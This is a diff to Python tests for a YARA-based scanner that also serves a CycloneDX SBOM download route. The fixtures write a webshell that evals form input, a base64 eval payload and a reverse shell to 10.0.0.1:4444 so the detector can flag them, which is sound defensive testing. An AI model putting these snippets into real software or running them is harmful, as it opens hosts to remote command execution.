@@ -6,8 +6,12 @@ from policy_engine import (
     analyze_yara,
     generate_cyclonedx_sbom,
 )
-from app.main import app, run_yara_scan
+from app.main import app
+from app.worker import run_yara_scan, publish_job_event
 
+# Mock publish_job_event to avoid errors
+import app.worker as worker_module
+worker_module.publish_job_event = lambda *args, **kwargs: None
 
 def test_analyze_secrets_pass():
     report = {"results": {}}
@@ -95,7 +99,7 @@ def test_run_yara_scan_webshell(tmp_path):
     test_file = tmp_path / "webshell.py"
     test_file.write_text("import flask\napp = flask.Flask(__name__)\n@app.route('/')\ndef shell():\n    eval(request.form['cmd'])\n")
     
-    findings = run_yara_scan(str(test_file))
+    findings = run_yara_scan(str(test_file), job_id="test_job")
     assert len(findings) > 0
     assert any(f["rule"] == "Backdoor_Webshell" for f in findings)
 
@@ -105,7 +109,7 @@ def test_run_yara_scan_obfuscated(tmp_path):
     test_file = tmp_path / "obfuscated.py"
     test_file.write_text("import base64\npayload = 'print(1)'\neval(base64.b64decode(payload))\n")
     
-    findings = run_yara_scan(str(test_file))
+    findings = run_yara_scan(str(test_file), job_id="test_job")
     assert len(findings) > 0
     assert any(f["rule"] == "Obfuscated_Payload" for f in findings)
 
@@ -115,16 +119,18 @@ def test_run_yara_scan_reverse_shell(tmp_path):
     test_file = tmp_path / "rev.py"
     test_file.write_text("import socket, subprocess, pty\ns = socket.socket()\ns.connect(('10.0.0.1', 4444))\npty.spawn('/bin/sh')\n")
     
-    findings = run_yara_scan(str(test_file))
+    findings = run_yara_scan(str(test_file), job_id="test_job")
     assert len(findings) > 0
     assert any(f["rule"] == "Suspicious_Shell_Spawn" for f in findings)
 
 
 def test_download_sbom_route():
-    app.config['TESTING'] = True
-    with app.test_client() as client:
-        response = client.get('/download-sbom')
-        assert response.status_code == 200
-        assert response.headers['Content-Type'] == 'application/json'
-        assert 'attachment' in response.headers['Content-Disposition']
-        assert 'cyclonedx-sbom.json' in response.headers['Content-Disposition']
+    from fastapi.testclient import TestClient
+    client = TestClient(app)
+    response = client.get('/download-sbom')
+    assert response.status_code == 200
+    ct = response.headers.get('content-type', '') or response.headers.get('Content-Type', '')
+    assert ct.startswith('application/json')
+    cd = response.headers.get('content-disposition', '') or response.headers.get('Content-Disposition', '')
+    assert 'attachment' in cd
+    assert 'cyclonedx-sbom.json' in cd
